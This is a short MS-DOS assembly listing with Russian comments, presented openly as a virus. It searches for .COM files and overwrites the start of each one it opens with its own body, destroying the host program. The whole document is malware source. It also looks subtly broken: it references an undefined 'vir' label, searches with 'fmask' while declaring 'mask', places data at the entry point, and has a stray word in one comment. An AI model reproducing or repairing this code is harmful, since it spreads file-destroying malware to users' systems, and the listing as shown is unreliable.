.model tiny
.code
org 100h
start:

mask db '*.C*', 0 ; маска поиска ,com-ника
vir_len equ $-vir

; ищем .com-ник
mov ah, 4Eh
mov dx, offset fmask
int 21h

; банк Открытие файла
mov ax,3D02h
mov dx,9Eh
int 21h

; записываем тело вируса в начало файла
xchg ax,bx
mov dx,100h
mov ah,40h
mov cl,vir_len
int 21h

; закрываем файл и выходим
mov ah,3Eh
int 21h
ret

mov ah, 4Ch
int 21h
end start